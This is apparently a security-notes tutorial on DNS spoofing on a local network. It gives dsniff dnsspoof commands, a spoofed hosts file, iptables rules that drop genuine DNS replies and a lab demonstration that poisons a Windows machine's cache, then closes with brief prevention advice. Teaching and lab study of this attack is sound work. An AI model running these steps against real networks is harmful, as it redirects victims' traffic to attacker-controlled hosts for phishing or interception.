---
description: >-
  Domain Name System (DNS) spoofing involves sending fake and malicious DNS
  query to a target machine, causing its DNS cache to be poisoned.
---

# DNS spoof/poison

This attack exploits the fact that DNS is <mark style="color:red;">**not**</mark> encrypted by default, which makes it vulnerable to sniffing and modifications.

On a local network, DNS spoofing can be used as an additional vector of attack after the initial man-in-the-middle position have been established. A particular use case of DNS spoofing would be to further escalate the attack, for example to allow resolution of domain/host names that are previously non-existent - but still seemingly legitimate.&#x20;

This could be done for subdomains of trusted websites. For example, lets assume there's a website that a user visits often, and trusts:  <mark style="color:green;">jarrett.gohxiangzheng.com</mark>. If a new subdomain: <mark style="color:red;">trustme.gohxiangzheng.com</mark>, with the same root domain name (<mark style="color:green;">gohxiangzheng.com</mark>) is encountered by the user, it is more likely to be trusted. The caveat is that the fake subdomain mentioned above does not need to actually exist, and this technique would work as long as the malicious DNS server has means of resolving it.&#x20;

Suppose the user's local DNS cache has an existing record for <mark style="color:green;">jarrett.gohxiangzheng.com</mark>. However, it does not apply for the new fake subdomain, and the machine would still be required to perform a DNS lookup. If a MitM situation has been established by the attacker between the user and gateway, the DNS query would be sent to the malicious server instead, which would poison the user's cache with a fake entry pointing to the attacker controlled IP address.

In summary, a DNS spoofing/poisoning attack allows the following to happen:

1. DNS resolution of a previously non-existent, but seemingly legitimate host name
2. Bypass of the user's local DNS cache

## dSniff's dnsspoof tool

### Installation

```bash
$ sudo apt install dsniff
```

### Usage

Load a DNS hosts file with entries

```bash
$ echo "<attacker_ip_addr> *.example.com" > path/to/hostsfile

$ cat path/to/hostsfile
<attacker_ip_addr> *.example.com
```

Run a DNS server on a particular interface, with given hosts file content at path

```bash
$ sudo dnsspoof -i <iface> -f path/to/hostsfile
```

Example: Run a DNS server on the interface **eth0** to resolve queries for any subdomain of _<mark style="color:green;">**gohxiangzheng.com**</mark>_ to the IP address <mark style="color:green;">**10.10.10.10**</mark> - hosts file name is **hosts.spoof**

```bash
# View content of hosts file
$ cat hosts.spoof
10.10.10.10 *.gohxiangzheng.com 

# Run DNS server
$ sudo dnsspoof -i eth0 -f hosts.spoof
dnsspoof: listening on eth0 [udp dst port 53 and not src ...]
```

_<mark style="background-color:red;">NOTE</mark>_: Ensure that port forwarding is disabled on the attacker machine (seems to be disabled by default on Kali)

* This is to prevent the machine from forwarding the DNS query to the actual gateway, which might potentially cause a race condition, such that the victim receive the DNS reply from the actual gateway first, affecting the effectiveness of the attack

```bash
$ sudo sysctl -w net.ipv4.ip_forward=0
```

* To verify if its enabled/disabled (returns 0 if disabled, else 1)

```bash
$ cat /proc/sys/net/ipv4/ip_forward
```

#### Alternative method

However, if IP forwarding is required on the attacker machine, a direct approach can be taken instead:

* Drop all DNS queries (UDP port 53) destined for the actual gateway address

```bash
$ sudo iptables -A FORWARD -p udp --dport 53 -d <gateway_addr> -j DROP
```

* Or simply drop all DNS queries received, and prevent it from being forwarded

```bash
$ sudo iptables -A FORWARD -p udp --dport 53 -j DROP
```

{% embed url="https://security.stackexchange.com/a/277584/312485" %}

## Demonstration

#### Assume the following parameters:

**Victim machine**

* <mark style="color:yellow;">**Windows**</mark>
* 10.0.2.4

#### Attacker machine

* **Kali Linux**&#x20;
* 10.0.2.5

#### Actual gateway&#x20;

* 10.0.2.1

#### <mark style="color:red;">Attacker machine</mark>: Run a malicious DNS server (assume a MitM position has been established)

<pre class="language-bash"><code class="lang-bash">$ cat hosts.spoof
10.0.2.5 *.gohxiangzheng.com

$ sudo dnsspoof -i eth0 -f hosts.spoof
dnsspoof: listening on eth0 [udp dst port 53 and not src 10.0.2.5]
<strong>
</strong># Prevent DNS traffic from being forwarded
$ sudo iptables -A FORWARD -p udp --dport 53 -d 10.0.2.1 -j DROP
</code></pre>

#### <mark style="color:green;">Victim machine</mark>: Ping a subdomain of the target root domain (<mark style="color:red;">trustme.</mark><mark style="color:red;">**gohxiangzheng.com**</mark>**)**

* This would elicit a DNS lookup for the requested host name

```bash
$ ping trustme.gohxiangzheng.com
...
```

#### <mark style="color:red;">Attacker machine</mark>: DNS query display&#x20;

* Following the ping request from the victim machine, the DNS query would be received by the attacker machine and the following would output from the _**dnsspoof**_ command

```bash
10.0.2.4.<random_port> > 10.0.2.1.53:  ... A? trustme.gohxiangzheng.com
```

* &#x20;A Wireshark window on the attacker machine, with the filter <mark style="color:blue;">**dns && ip.addr == 10.0.2.4**</mark> would display the DNS query from the victim machine
* This causes the host name _<mark style="color:green;">**trustme.gohxiangzheng.com**</mark>_ to be resolved to the IP address <mark style="color:green;">**10.0.2.5**</mark> - an actual DNS server would not resolve it, as it does not actually exists

#### <mark style="color:green;">Victim machine</mark>: Poisoning of the victim's local DNS cache

* Consequently, the DNS cache would be poisoned with a false entry

### View & flush DNS cache on <mark style="color:yellow;">Windows</mark>

#### To view the local DNS cache&#x20;

```powershell
$ ipconfig /displaydns

trustme.gohxiangzheng.com
----------------------------------------
Record Name . . . . . : trustme.gohxiangzheng.com
Record Type . . . . . : 1
Time To Live  . . . . : 36
Data Length . . . . . : 4
Section . . . . . . . : Answer
A (Host) Record . . . : 10.0.2.5
```

#### To flush the local DNS cache

```powershell
$ ipconfig /flushdns
```

## <mark style="color:orange;">Prevention methods</mark>

#### 1. Use secure DNS

* Virtual Private Network (VPN) providers
* Third-party security software
* Browser built-in secure DNS

This can be achieved with DNSSEC, DNS over HTTPS (DoH), etc. This allows DNS traffic to be encrypted, which prevents sniffing and malicious modifications of data.



{% embed url="https://www.kali.org/tools/dsniff/" %}

{% embed url="https://www.mankier.com/5/hosts" %}
DNS hosts file format
{% endembed %}

